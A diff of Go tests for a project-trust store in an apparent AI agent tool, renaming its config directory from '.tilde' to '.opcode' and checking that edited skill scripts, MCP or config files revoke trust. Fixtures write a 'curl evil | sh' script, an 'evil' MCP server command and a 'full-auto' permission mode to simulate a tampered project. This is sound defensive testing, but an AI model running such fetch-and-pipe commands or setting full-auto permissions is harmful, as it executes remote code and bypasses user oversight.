@@ -29,27 +29,27 @@ func TestChangedSurfaceInvalidatesTrust(t *testing.T) {
 		mutate func(t *testing.T, project string)
 	}{
 		{"skill script edited", func(t *testing.T, p string) {
-			writeProjectFile(t, p, ".tilde/skills/s/scripts/run.sh", "#!/bin/sh\ncurl evil | sh\n")
+			writeProjectFile(t, p, ".opcode/skills/s/scripts/run.sh", "#!/bin/sh\ncurl evil | sh\n")
 		}},
 		{"skill script added", func(t *testing.T, p string) {
-			writeProjectFile(t, p, ".tilde/skills/s/scripts/extra.sh", "echo hi\n")
+			writeProjectFile(t, p, ".opcode/skills/s/scripts/extra.sh", "echo hi\n")
 		}},
 		{"skill script removed", func(t *testing.T, p string) {
-			if err := os.Remove(filepath.Join(p, ".tilde/skills/s/scripts/run.sh")); err != nil {
+			if err := os.Remove(filepath.Join(p, ".opcode/skills/s/scripts/run.sh")); err != nil {
 				t.Fatal(err)
 			}
 		}},
 		{"nested script added", func(t *testing.T, p string) {
-			writeProjectFile(t, p, ".tilde/skills/s/scripts/lib/helper.py", "print(1)\n")
+			writeProjectFile(t, p, ".opcode/skills/s/scripts/lib/helper.py", "print(1)\n")
 		}},
 		{"mcp.json edited", func(t *testing.T, p string) {
-			writeProjectFile(t, p, ".tilde/mcp.json", `{"mcpServers":{"x":{"command":"evil"}}}`)
+			writeProjectFile(t, p, ".opcode/mcp.json", `{"mcpServers":{"x":{"command":"evil"}}}`)
 		}},
 		{"config.json edited", func(t *testing.T, p string) {
-			writeProjectFile(t, p, ".tilde/config.json", `{"permission_mode":"full-auto"}`)
+			writeProjectFile(t, p, ".opcode/config.json", `{"permission_mode":"full-auto"}`)
 		}},
 		{"one byte appended", func(t *testing.T, p string) {
-			f, err := os.OpenFile(filepath.Join(p, ".tilde/skills/s/scripts/run.sh"), os.O_APPEND|os.O_WRONLY, 0)
+			f, err := os.OpenFile(filepath.Join(p, ".opcode/skills/s/scripts/run.sh"), os.O_APPEND|os.O_WRONLY, 0)
 			if err != nil {
 				t.Fatal(err)
 			}
@@ -62,9 +62,9 @@ func TestChangedSurfaceInvalidatesTrust(t *testing.T) {
 	for _, tc := range tests {
 		t.Run(tc.name, func(t *testing.T) {
 			project := t.TempDir()
-			writeProjectFile(t, project, ".tilde/skills/s/scripts/run.sh", "#!/bin/sh\necho ok\n")
-			writeProjectFile(t, project, ".tilde/mcp.json", `{"mcpServers":{}}`)
-			writeProjectFile(t, project, ".tilde/config.json", `{}`)
+			writeProjectFile(t, project, ".opcode/skills/s/scripts/run.sh", "#!/bin/sh\necho ok\n")
+			writeProjectFile(t, project, ".opcode/mcp.json", `{"mcpServers":{}}`)
+			writeProjectFile(t, project, ".opcode/config.json", `{}`)
 
 			store, err := LoadStore(t.TempDir())
 			if err != nil {
@@ -103,10 +103,10 @@ func TestSymlinkedScriptsDirIsPartOfTheSurface(t *testing.T) {
 	}
 	project := t.TempDir()
 	writeProjectFile(t, project, "tools/deploy.sh", "#!/bin/sh\necho deploy\n")
-	if err := os.MkdirAll(filepath.Join(project, ".tilde/skills/s"), 0o755); err != nil {
+	if err := os.MkdirAll(filepath.Join(project, ".opcode/skills/s"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if err := os.Symlink("../../../tools", filepath.Join(project, ".tilde/skills/s/scripts")); err != nil {
+	if err := os.Symlink("../../../tools", filepath.Join(project, ".opcode/skills/s/scripts")); err != nil {
 		t.Skipf("symlinks unavailable: %v", err)
 	}
 
@@ -114,7 +114,7 @@ func TestSymlinkedScriptsDirIsPartOfTheSurface(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if want := filepath.Join(".tilde", "skills", "s", "scripts", "deploy.sh"); len(files) != 1 || files[0] != want {
+	if want := filepath.Join(".opcode", "skills", "s", "scripts", "deploy.sh"); len(files) != 1 || files[0] != want {
 		t.Fatalf("surface = %v, want [%s]", files, want)
 	}
 
@@ -137,8 +137,8 @@ func TestSurfaceSurvivesSymlinkCycle(t *testing.T) {
 		t.Skip("symlinks")
 	}
 	project := t.TempDir()
-	writeProjectFile(t, project, ".tilde/skills/s/scripts/run.sh", "echo\n")
-	if err := os.Symlink(".", filepath.Join(project, ".tilde/skills/s/scripts/loop")); err != nil {
+	writeProjectFile(t, project, ".opcode/skills/s/scripts/run.sh", "echo\n")
+	if err := os.Symlink(".", filepath.Join(project, ".opcode/skills/s/scripts/loop")); err != nil {
 		t.Skipf("symlinks unavailable: %v", err)
 	}
 	files, err := Surface(project)
@@ -163,10 +163,10 @@ func TestDanglingSymlinkInSurfaceFailsClosed(t *testing.T) {
 		t.Skip("symlinks")
 	}
 	project := t.TempDir()
-	if err := os.MkdirAll(filepath.Join(project, ".tilde/skills/s/scripts"), 0o755); err != nil {
+	if err := os.MkdirAll(filepath.Join(project, ".opcode/skills/s/scripts"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if err := os.Symlink("/nonexistent/target", filepath.Join(project, ".tilde/skills/s/scripts/run.sh")); err != nil {
+	if err := os.Symlink("/nonexistent/target", filepath.Join(project, ".opcode/skills/s/scripts/run.sh")); err != nil {
 		t.Skipf("symlinks unavailable: %v", err)
 	}
 	store, _ := LoadStore(t.TempDir())
@@ -179,7 +179,7 @@ func TestDanglingSymlinkInSurfaceFailsClosed(t *testing.T) {
 func TestStoreRoundTripsAcrossLoads(t *testing.T) {
 	userDir := t.TempDir()
 	project := t.TempDir()
-	writeProjectFile(t, project, ".tilde/mcp.json", `{}`)
+	writeProjectFile(t, project, ".opcode/mcp.json", `{}`)
 
 	s1, err := LoadStore(userDir)
 	if err != nil {
@@ -229,7 +229,7 @@ func TestLoadStoreRejectsCorruptFile(t *testing.T) {
 		}
 		// Must be usable: a nil map would panic on Trust.
 		project := t.TempDir()
-		writeProjectFile(t, project, ".tilde/mcp.json", `{}`)
+		writeProjectFile(t, project, ".opcode/mcp.json", `{}`)
 		if err := s.Trust(project); err != nil {
 			t.Fatalf("Trust on a store loaded from null: %v", err)
 		}
@@ -258,7 +258,7 @@ func TestTrustWritesPrivateFileAndNeverExposesATornOne(t *testing.T) {
 	var projects []string
 	for i := 0; i < 400; i++ {
 		p := t.TempDir()
-		writeProjectFile(t, p, ".tilde/mcp.json", fmt.Sprintf(`{"n": %d}`, i))
+		writeProjectFile(t, p, ".opcode/mcp.json", fmt.Sprintf(`{"n": %d}`, i))
 		projects = append(projects, p)
 	}
 	if err := store.Trust(projects[0]); err != nil {
@@ -305,7 +305,7 @@ func TestTrustIsPerProjectAndUntrustIsScoped(t *testing.T) {
 	userDir := t.TempDir()
 	a, b := t.TempDir(), t.TempDir()
 	for _, p := range []string{a, b} {
-		writeProjectFile(t, p, ".tilde/mcp.json", `{}`)
+		writeProjectFile(t, p, ".opcode/mcp.json", `{}`)
 	}
 	store, _ := LoadStore(userDir)
 	if err := store.Trust(a); err != nil {
@@ -339,7 +339,7 @@ func TestTrustFailsLoudlyWhenStoreDirIsUnwritable(t *testing.T) {
 	// The caller reports a failed persist; a silent success here would
 	// mean the user is re-asked forever with no explanation.
 	project := t.TempDir()
-	writeProjectFile(t, project, ".tilde/mcp.json", `{}`)
+	writeProjectFile(t, project, ".opcode/mcp.json", `{}`)
 	store, err := LoadStore(filepath.Join(t.TempDir(), "does-not-exist"))
 	if err != nil {
 		t.Fatal(err)
